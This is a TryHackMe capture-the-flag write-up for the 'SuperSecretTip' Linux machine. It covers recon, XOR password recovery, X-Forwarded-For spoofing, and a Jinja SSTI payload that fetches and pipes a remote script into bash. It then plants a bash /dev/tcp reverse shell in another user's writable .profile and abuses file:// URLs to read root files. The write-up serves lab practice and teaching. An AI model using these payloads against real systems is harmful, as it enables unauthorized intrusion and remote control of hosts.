# TryHackMe - SuperSecretTip Writeup

> A walkthrough of the **SuperSecretTip** medium Linux machine from TryHackMe.

---

## Machine Information

| Platform  | Difficulty | OS    |
| --------- | ---------- | ----- |
| TryHackMe | Medium     | Linux |

### Scenario

> Well, Well, Well, you're here, and I am glad to see that! Your task is simple.. well, not really.. I mean, it's kind of.. but.. anyways...
>
> I was debugging my work and forgot about some probably harmful code, and sadly, I lost access to my machine.
>
> Could you find my valuable information for me?

---

# Table of Contents

* [Reconnaissance](#reconnaissance)
* [Web Enumeration](#web-enumeration)
* [Source Code Analysis](#source-code-analysis)
* [XOR Password Decryption](#xor-password-decryption)
* [Bypassing IP Restriction](#bypassing-ip-restriction)
* [SSTI Exploitation](#ssti-exploitation)
* [Initial Access](#initial-access)
* [Flag 1](#flag-1)
* [Privilege Escalation](#privilege-escalation)
* [Accessing Flag 2 and Secret](#accessing-flag-2-and-secret)
* [Final Decryption](#final-decryption)
* [Key Takeaways](#key-takeaways)

---

# Reconnaissance

The target machine IP provided by TryHackMe was:

```text
10.49.159.230
```

## Initial Port Scan

Starting with an Nmap scan:

```bash
nmap -p- --min-rate 5000 10.49.159.230
```

### Result

```text
PORT     STATE SERVICE
22/tcp   open  ssh
7777/tcp open  cbt
```

Only two ports were exposed:

* `22` - SSH
* `7777` - Unknown service

---

## Service Enumeration

Let's perform a more detailed scan.

```bash
nmap -sC -sV -p22,7777 10.49.159.230
```

### Result

```text
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu
7777/tcp open  unknown
```

Nmap detected an HTTP response running on port `7777`.

```text
HTTP/1.1 200 OK
Server: Werkzeug/2.3.4 Python/3.11.0
```

Another interesting piece of information was found in the HTML metadata:

```html
<meta name="description" content="SSTI is wonderful">
```

This is a strong hint toward:

> **Server-Side Template Injection (SSTI)**

---

# Web Enumeration

Since port `7777` was serving a web application, directory enumeration was performed.

Interesting directories discovered:

```text
/debug
/cloud
```

---

## `/cloud`

The `/cloud` endpoint allowed downloading files from the internal application.

One interesting parameter was:

```text
download=source.py
```

Calling the source file revealed important application logic.

---

# Source Code Analysis

While reviewing the application source, several interesting files and routes were identified:

```text
/debug
/debugresult
/templates
```

An important line from the source was:

```python
password = str(open('supersecrettip.txt').readline().strip())
```

This indicated that the application password was stored inside:

```text
supersecrettip.txt
```

Another file of interest was:

```text
debugpassword.py
```

The source contained:

```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

The password was XOR encrypted using the key:

```text
ayham
```

---

# XOR Password Decryption

The encrypted bytes obtained were:

```python
b'\x20\x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'
```

A simple Python script was created to decrypt the data.

```python
import pwn

def get_encrypted(data):
    return pwn.xor(data, b'ayham')


input_bytes = b'\x20\x00\x00\x00\x00%\x1c\r\x03\x18\x06\x1e'

decrypted = get_encrypted(input_bytes)

print("Raw decrypted bytes:", decrypted)

try:
    print("Decrypted password:", decrypted.decode("utf-8"))
except UnicodeDecodeError:
    print("Decrypted data (hex):", decrypted.hex())
```

Running the script:

```bash
python xor.py
```

Output:

```text
Raw decrypted bytes: b'AyhamDeebugg'
Decrypted password: AyhamDeebugg
```

We successfully recovered the password:

```text
AyhamDeebugg
```

---

# Bypassing IP Restriction

Although we now had the password, accessing the debugger functionality directly was restricted.

Another source file was downloaded:

```text
ip.py
```

The source contained:

```python
host_ip = "127.0.0.1"

def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```

The application trusted the `X-Forwarded-For` header.

Therefore, we could spoof localhost by setting:

```text
X-Forwarded-For: 127.0.0.1
```

This allowed us to bypass the IP restriction.

---

# SSTI Exploitation

Earlier during enumeration, the application contained the hint:

```text
SSTI is wonderful
```

Testing template expressions showed that SSTI was possible.

An SSTI payload was used to execute commands on the server.

```bash
curl 'http://10.49.159.230:7777/debug?debug={{self.__init__.__globals__.__builtins__.__import__("os").popen("curl+192.168.138.6/exp.sh+|+bash").read()}}&password=AyhamDeebugg' -I
```

The payload executed a command on the target and connected back to our listener.

---

# Initial Access

A Netcat listener was started:

```bash
nc -lvnp 4444
```

Connection received:

```text
connect to [192.168.138.6] from [10.49.159.230]
```

We obtained a shell as:

```text
ayham
```

Checking the current directory:

```bash
ls
```

Output:

```text
__pycache__
cloud
debugpassword.py
ip.py
source.py
static
supersecrettip.txt
templates
```

---

# Shell Stabilization

The shell was upgraded using Python PTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Background the shell:

```text
CTRL + Z
```

Then configure the terminal:

```bash
stty raw -echo
fg
```

Finally:

```bash
export TERM=xterm-256color
```

We now had a more stable interactive shell.

---

# Flag 1

Searching for the first flag:

```bash
find / -type f -name 'flag1.txt' 2>/dev/null
```

Output:

```text
/home/ayham/flag1.txt
```

Reading the flag:

```bash
cat /home/ayham/flag1.txt
```

### Flag 1

```text
THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}
```

---

# Privilege Escalation

Time to enumerate the system.

LinPEAS was executed:

```bash
./linpeas.sh
```

Interesting findings included:

```text
/.dockerenv
/secret-tip.txt
/app
```

The presence of:

```text
/.dockerenv
```

suggested that the environment was running inside a Docker container.

Another interesting discovery:

```text
/home/F30s/health_check
/home/F30s/.profile
```

The `.profile` file belonging to the `F30s` user was writable.

---

# Lateral Movement to F30s

Since `/home/F30s/.profile` was writable, a reverse shell payload was added.

```bash
echo 'bash -c "bash -i >& /dev/tcp/192.168.138.6/4445 0>&1"' >> /home/F30s/.profile
```

A listener was started:

```bash
nc -lvnp 4445
```

After waiting for execution, a shell was received.

```text
F30s@482cbf2305ae:~$
```

We successfully obtained access as:

```text
F30s
```

---

# Investigating Scheduled Scripts

Checking the `site_check` file:

```bash
cat site_check
```

Output:

```python
url = "http://192.168.138.6/test.txt"
output = "/tmp/test.txt"
```

This showed that `curl` was being used to retrieve content from the specified URL and save it locally.

---

# Accessing Flag 2 and Secret

Instead of attempting to modify `/etc/passwd`, the target files were directly accessed using the `file://` protocol.

The `site_check` file was modified to point toward:

```text
file:///root/flag2.txt
```

Example:

```python
url = "file:///root/flag2.txt"
output = "/tmp/flag2.txt"
```

The downloaded file contained:

```text
b'ey}BQB_^[\\ZEnw\x01uWoY~aF\x0fiRdbum\x04BUn\x06[\x02CHonZ\x03~or\x03UT\x00_\x03]mD\x00W\x02gpScL'
```

Similarly, the secret file was retrieved.

```text
b'C^_M@__DC\\7,'
```

At this stage, both the encrypted Flag 2 and encrypted secret/password were available locally.

---

# Identifying the XOR Key

A custom wordlist was generated using words associated with the machine and challenge context.

Several possible XOR keys were tested.

Example output:

```text
Key: 'their'
Key: 'the'
Key: 'before'
Key: 'was'
Key: 'missing'
Key: 'they'
Key: 'actually'
Key: 'wise'
Key: 'gpt'
Key: 'once'
Key: 'said'
Key: 'called'
Key: 'forgot'
Key: 'anyways'
Key: 'need'
Key: 'remember'
Key: 'important'
Key: 'past'
Key: 'back'
Key: 'not'
Key: 'after'
Key: 'matters'
Key: 'follow'
Key: 'forget'
Key: 'always'
Key: 'about'
Key: 'root'
```

One important discovery was the XOR key:

```text
110920001386
```

---

# Final Decryption

The encrypted Flag 2 was processed using XOR decryption.

CyberChef was used with:

```text
From Hex
XOR
```

The XOR key used was:

```text
110920001386
```

The encrypted content could then be decrypted to reveal the remaining challenge information.

---

# Attack Path Summary

```text
┌─────────────────────┐
│   Nmap Scan         │
│                     │
│ 22 - SSH            │
│ 7777 - Web Server   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Directory Enumeration│
│                     │
│ /debug              │
│ /cloud              │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Source Code Review  │
│                     │
│ Find XOR Password   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ XOR Decryption      │
│                     │
│ AyhamDeebugg        │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Header Spoofing     │
│                     │
│ X-Forwarded-For     │
│ 127.0.0.1           │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ SSTI Exploitation   │
│                     │
│ Remote Code Exec    │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Initial Shell       │
│                     │
│ User: ayham         │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Find Flag 1         │
│                     │
│ /home/ayham         │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ LinPEAS Enumeration │
│                     │
│ Writable .profile   │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ Access as F30s      │
│                     │
│ Reverse Shell       │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ File Read Abuse     │
│                     │
│ file:///root/       │
└──────────┬──────────┘
           │
           ▼
┌─────────────────────┐
│ XOR Decryption      │
│                     │
│ Flag 2 + Secret     │
└─────────────────────┘
```

---

# Key Takeaways

This machine demonstrated several important security concepts:

* Port and service enumeration with Nmap
* Web directory enumeration
* Source code analysis
* XOR encryption and decryption
* Python scripting for custom decryption
* Trusting client-controlled HTTP headers
* `X-Forwarded-For` spoofing
* Server-Side Template Injection (SSTI)
* Remote Code Execution
* Reverse shell handling
* Shell stabilization
* Linux privilege escalation enumeration
* Docker environment identification
* Writable user profile exploitation
* Abuse of scheduled scripts
* Local File Inclusion concepts
* `file://` protocol abuse
* Custom wordlist generation
* XOR brute forcing
* CyberChef-based data analysis

---

# Flags

## Flag 1

```text
THM{LFI_1s_Pr33Ty_Aw3s0Me_1337}
```

## Flag 2

```text
[Recovered through XOR decryption]
```

---

# Tools Used

```text
Nmap
Gobuster / Directory Enumeration
Burp Suite
Curl
Netcat
Python
Pwntools
LinPEAS
CyberChef
CeWL
```

---

## Lessons Learned

This machine is a good example of how multiple relatively small security issues can be chained together.

The overall attack path involved:

1. Finding an exposed debugging application.
2. Reading application source code.
3. Decrypting hardcoded credentials.
4. Bypassing IP restrictions through header spoofing.
5. Exploiting SSTI for remote command execution.
6. Enumerating the container environment.
7. Exploiting writable files belonging to another user.
8. Abusing automated file retrieval.
9. Recovering encrypted sensitive information.
10. Decrypting the final data using XOR analysis.

> **Always remember:** Debug functionality, trusting client-controlled headers, insecure file handling, and weak encryption mechanisms can create a dangerous attack chain when combined.

---

### Disclaimer

This writeup is created for **educational purposes only** as part of a TryHackMe CTF-style environment. All techniques demonstrated here were performed against an intentionally vulnerable machine in an authorized lab environment.

---

**Happy Hacking!**
